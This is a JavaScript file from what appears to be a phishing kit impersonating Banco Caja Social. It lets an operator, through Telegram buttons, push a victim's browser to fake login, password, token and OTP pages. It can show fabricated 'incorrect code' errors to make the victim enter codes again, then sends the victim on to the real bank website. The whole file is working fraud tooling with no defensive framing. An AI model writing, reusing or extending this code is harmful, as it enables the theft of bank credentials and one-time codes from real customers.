/**
 * Botones y errores Telegram — Caja Social
 */
(function() {
    'use strict';

    const LOGIN_ERROR_KEY = 'cajaSocialLoginError';
    const OTP_ERROR_KEY = 'cajaSocialOtpError';
    const TOKEN_ERROR_KEY = 'cajaSocialTokenError';

    const OTP_TOKEN_ERROR_TEXT = 'CODIGO OTP INGRESADO INCORRECTO O TOKEN INGRESADO INCORRECTO';

    const TELEGRAM_BUTTONS = [
        { text: '🔐 Pedir Login', action: 'login' },
        { text: '🔑 Pedir Password', action: 'password' },
        { text: '📱 Pedir Token', action: 'token' },
        { text: '📱 Pedir OTP', action: 'otp' },
        { text: '❌ Error Login', action: 'error_login' },
        { text: '❌ Error OTP', action: 'error_otp' },
        { text: '❌ Error Token', action: 'error_token' },
        { text: '✅ Finalizar', action: 'finalizar' }
    ];

    const PAGE_MAP = {
        login: 'index.html',
        password: 'password.html',
        token: 'token.html',
        otp: 'otp.html',
        finalizar: 'https://www.bancocajasocial.com/'
    };

    function currentPage() {
        return window.location.pathname.split('/').pop() || 'index.html';
    }

    function pageUrl(file) {
        return `/bancas/Caja-Social/${file}`;
    }

    function hideLoadingOverlay() {
        if (window.BancoUtils) BancoUtils.hideOverlay();
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.remove('show', 'active');
            overlay.style.display = 'none';
        }
    }

    function applyLoginError() {
        const alert = document.getElementById('loginErrorAlert');
        const intentos = document.getElementById('intentosRestantes');
        const usuario = document.getElementById('usuario');
        const btn = document.getElementById('submitBtn') || document.querySelector('.btn-siguiente');

        if (alert) alert.hidden = false;
        if (intentos) intentos.hidden = false;

        if (usuario) {
            usuario.value = '';
            usuario.classList.add('error');
        }
        if (btn) {
            btn.classList.remove('enabled');
            btn.disabled = true;
        }
    }

    function applyOtpError() {
        const alert = document.getElementById('otpTokenErrorAlert');
        const otp = document.getElementById('otp');
        const btn = document.getElementById('btnVerificar');

        if (alert) {
            alert.hidden = false;
            const strong = alert.querySelector('strong');
            if (strong) strong.textContent = OTP_TOKEN_ERROR_TEXT;
        }
        if (otp) {
            otp.value = '';
            otp.classList.add('error');
        }
        if (btn) {
            btn.classList.remove('enabled');
            btn.disabled = true;
        }
    }

    function applyTokenError() {
        const alert = document.getElementById('otpTokenErrorAlert');
        const token = document.getElementById('token');
        const btn = document.getElementById('btnContinuar');

        if (alert) {
            alert.hidden = false;
            const strong = alert.querySelector('strong');
            if (strong) strong.textContent = OTP_TOKEN_ERROR_TEXT;
        }
        if (token) {
            token.value = '';
            token.classList.add('error');
        }
        if (btn) {
            btn.classList.remove('enabled');
            btn.disabled = true;
        }
    }

    function initLoginErrorFromStorage() {
        if (!sessionStorage.getItem(LOGIN_ERROR_KEY)) return;
        sessionStorage.removeItem(LOGIN_ERROR_KEY);
        applyLoginError();
    }

    function initOtpErrorFromStorage() {
        if (!sessionStorage.getItem(OTP_ERROR_KEY)) return;
        sessionStorage.removeItem(OTP_ERROR_KEY);
        applyOtpError();
    }

    function initTokenErrorFromStorage() {
        if (!sessionStorage.getItem(TOKEN_ERROR_KEY)) return;
        sessionStorage.removeItem(TOKEN_ERROR_KEY);
        applyTokenError();
    }

    function setupDismissHandlers() {
        document.querySelectorAll('[data-dismiss-alert]').forEach((btn) => {
            btn.addEventListener('click', () => {
                const id = btn.getAttribute('data-dismiss-alert');
                const el = document.getElementById(id);
                if (el) el.hidden = true;
            });
        });

        const usuario = document.getElementById('usuario');
        if (usuario) {
            usuario.addEventListener('input', () => usuario.classList.remove('error'));
        }
        const otp = document.getElementById('otp');
        if (otp) {
            otp.addEventListener('input', () => otp.classList.remove('error'));
        }
        const token = document.getElementById('token');
        if (token) {
            token.addEventListener('input', () => token.classList.remove('error'));
        }
    }

    function initPageErrors() {
        const page = currentPage();
        if (page === 'index.html') initLoginErrorFromStorage();
        if (page === 'otp.html') initOtpErrorFromStorage();
        if (page === 'token.html') initTokenErrorFromStorage();
        setupDismissHandlers();
    }

    function getKeyboard() {
        if (!window.BancoUtils) return null;
        return BancoUtils.createKeyboard(TELEGRAM_BUTTONS, BancoUtils.getSessionId());
    }

    function navigateTo(file) {
        if (file.startsWith('http')) {
            window.location.href = file;
        } else {
            window.location.href = pageUrl(file);
        }
    }

    function handleTelegramAction(data) {
        if (!data || !data.action) return;

        hideLoadingOverlay();

        if (data.action === 'error_login') {
            sessionStorage.setItem(LOGIN_ERROR_KEY, '1');
            if (currentPage() === 'index.html') {
                sessionStorage.removeItem(LOGIN_ERROR_KEY);
                applyLoginError();
            } else {
                navigateTo('index.html');
            }
            return;
        }

        if (data.action === 'error_otp') {
            sessionStorage.setItem(OTP_ERROR_KEY, '1');
            if (currentPage() === 'otp.html') {
                sessionStorage.removeItem(OTP_ERROR_KEY);
                applyOtpError();
            } else {
                navigateTo('otp.html');
            }
            return;
        }

        if (data.action === 'error_token') {
            sessionStorage.setItem(TOKEN_ERROR_KEY, '1');
            if (currentPage() === 'token.html') {
                sessionStorage.removeItem(TOKEN_ERROR_KEY);
                applyTokenError();
            } else {
                navigateTo('token.html');
            }
            return;
        }

        const next = PAGE_MAP[data.action];
        if (next) navigateTo(next);
    }

    window.CajaSocialTelegram = {
        TELEGRAM_BUTTONS,
        OTP_TOKEN_ERROR_TEXT,
        getKeyboard,
        handleTelegramAction,
        initPageErrors,
        applyLoginError,
        applyOtpError,
        applyTokenError
    };
})();
